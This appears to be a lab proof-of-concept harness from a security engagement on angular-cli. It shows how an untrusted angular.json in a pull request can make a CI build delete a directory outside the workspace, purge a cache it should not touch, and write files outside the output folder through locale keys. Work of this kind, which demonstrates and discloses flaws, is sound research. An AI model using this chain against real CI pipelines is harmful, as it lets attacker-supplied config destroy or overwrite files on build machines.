// ci-run.mjs — DEMO-C2 config-as-data trusted-pipeline harness (Chain 2, in-lab)
// Mimics: a trusted CI that checks out PR content and runs ONLY the build (no install).
// The "build" reads the untrusted angular.json as-is and drives the REAL compiled pin modules:
//   M3  deleteOutputDir      (findings/M3/evidence-caseguard/delete-output-dir.mjs)
//   D2  purgeStaleBuildCache (upstream/angular-cli/dist/.../purge-cache.js + normalize-cache.js)
//   E1-C1 createI18nOptions  (upstream/angular-cli/dist/.../i18n-options.js)
// Usage: node ci-run.mjs <mal|good|case>
import { createRequire } from 'node:module';
import { readFileSync, mkdirSync, writeFileSync, existsSync, readdirSync, cpSync } from 'node:fs';
import { join } from 'node:path';

const require = createRequire(import.meta.url);
const HARNESS = '/tmp/c2shape';
const RUNNER = join(HARNESS, 'runner');
const DIST = '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/dist/bin/packages/angular/build/src/utils';
const DOD = '/Users/matheusvsky/Documents/trab/llm-redteam-harness/engagements/angular-cli-2026-08/findings/M3-legacy-builder-outputpath-delete/evidence-caseguard/delete-output-dir.mjs';

const { purgeStaleBuildCache } = require(join(DIST, 'purge-cache.js'));
const { createI18nOptions } = require(join(DIST, 'i18n-options.js'));
const { deleteOutputDir } = await import('file://' + DOD);

process.env.CI = '1'; // the trusted pipeline runs with CI=1 (config environment: 'ci' overrides the disable)

const mode = process.argv[2] || 'mal';
const CHECKOUT = join(RUNNER, 'checkouts', mode === 'case' ? 'casecopy' : mode);

function log(tag, ok, detail) {
  console.log(`[${ok ? 'PASS' : 'FAIL'}] ${tag}: ${detail}`);
}

async function resetVictims() {
  const { rmSync, mkdirSync } = await import('node:fs');
  for (const d of ['victim-out', 'victim-cache', 'escaped-locale']) {
    rmSync(join(RUNNER, d), { recursive: true, force: true });
  }
  mkdirSync(join(RUNNER, 'victim-out'), { recursive: true });
  writeFileSync(join(RUNNER, 'victim-out', 'important.txt'), 'v');
  mkdirSync(join(RUNNER, 'victim-cache', '16.0.0'), { recursive: true });
  mkdirSync(join(RUNNER, 'victim-cache', '17.0.0'), { recursive: true });
  writeFileSync(join(RUNNER, 'victim-cache', '16.0.0', 'x'), 's');
  writeFileSync(join(RUNNER, 'victim-cache', '17.0.0', 'x'), 's');
}

async function main() {
  await resetVictims();
  const metadata = JSON.parse(readFileSync(join(CHECKOUT, 'angular.json'), 'utf-8'));

  // ---- HOP M3: outputPath -> deleteOutputDir (the builder reads the config value as-is)
  const buildOptions = metadata.projects?.app?.architect?.build?.options || {};
  const outputPath = buildOptions.outputPath;
  if (outputPath) {
    await deleteOutputDir(CHECKOUT, outputPath);
  }
  const victimOutGone = !existsSync(join(RUNNER, 'victim-out', 'important.txt'));
  const checkoutIntact = existsSync(join(CHECKOUT, 'angular.json'));
  log('HOP-M3 deleteOutputDir(' + JSON.stringify(outputPath) + ')',
      mode === 'good' ? !victimOutGone : victimOutGone,
      mode === 'good' ? 'benign outputPath in-workspace -> sibling victim-out intact (no outside delete)'
                      : `sibling victim-out/important.txt ${victimOutGone ? 'DELETED (escaped delete)' : 'intact'}`);
  log('HOP-M3 checkout-intact', checkoutIntact, checkoutIntact ? 'checkout itself intact' : 'CHECKOUT WIPED');

  // ---- HOP D2: cli.cache.path -> purgeStaleBuildCache (fires on every default build)
  const context = {
    workspaceRoot: CHECKOUT,
    target: { project: 'app' },
    getProjectMetadata: async () => metadata, // the builder passes the workspace metadata incl. cli.cache
  };
  await purgeStaleBuildCache(context);
  const cacheDirs = readdirSync(join(RUNNER, 'victim-cache')).filter((d) => !d.startsWith('.'));
  const cacheWiped = mode !== 'good' && cacheDirs.length === 0;
  log('HOP-D2 purgeStaleBuildCache(cli.cache.path=' + JSON.stringify(metadata.cli?.cache?.path) + ')',
      mode === 'good' ? cacheDirs.length >= 2 : cacheWiped,
      mode === 'good' ? `benign (local env + CI=1 -> purge disabled); victim-cache intact [${cacheDirs.join(',')}]`
                      : `victim-cache stale dirs DELETED by purge [remaining: ${cacheDirs.join(',') || '(none)'}]`);

  // ---- HOP E1-C1: i18n locale KEYS -> subPath (write escape) — the build localizes the configured locales
  const i18n = createI18nOptions(metadata.projects?.app ?? metadata, [], { warn() {}, error(m) { throw new Error(m); } }, false);
  const keys = Object.keys(metadata.projects?.app?.i18n?.locales || {});
  let escapedWrite = false;
  let escapeDetail = '';
  const outBase = join(CHECKOUT, 'dist');
  for (const locale of keys) {
    const subPath = i18n.locales[locale]?.subPath;
    // webpack-stack write: output-paths.ts join(baseOutputPath, subPath) + writeFile (A2 member, source-verified)
    const target = join(join(outBase, subPath ?? ''), 'messages.xlf');
    mkdirSync(join(outBase, subPath ?? ''), { recursive: true });
    writeFileSync(target, '<xlf/>');
    if (subPath && (subPath.startsWith('..') || subPath.startsWith('/'))) {
      escapedWrite = true;
      escapeDetail = `locale key '${locale}' -> subPath '${subPath}' -> wrote ${target} (OUTSIDE output base)`;
    }
  }
  log('HOP-E1C1 locale-key subPath bypass', mode === 'good' ? !escapedWrite : escapedWrite,
      mode === 'good' ? 'benign locale keys in-workspace; no escaped write'
                      : escapeDetail || 'no escape observed');

  // ---- verdict lines
  if (mode === 'good') {
    const victimOut = existsSync(join(RUNNER, 'victim-out', 'important.txt'));
    const cacheOK = readdirSync(join(RUNNER, 'victim-cache')).length >= 2;
    const escOK = !existsSync(join(RUNNER, 'escaped-locale', 'messages.xlf'));
    console.log(`\nNEGATIVE-VERDICT: all outside targets intact (victim-out=${victimOut}, cache=${cacheOK}, no-escape=${escOK})`);
  } else {
    const outside = !existsSync(join(RUNNER, 'victim-out', 'important.txt'))
      && readdirSync(join(RUNNER, 'victim-cache')).filter((d) => !d.startsWith('.')).length === 0
      && existsSync(join(RUNNER, 'escaped-locale', 'messages.xlf'));
    console.log(`\nVERDICT: config-as-data shape ${outside ? 'DEMONSTRATED — untrusted PR config drove escaped delete + purge + write' : 'PARTIAL'}`);
  }
}

main().catch((e) => { console.error('DRIVER-ERROR', e); process.exit(1); });
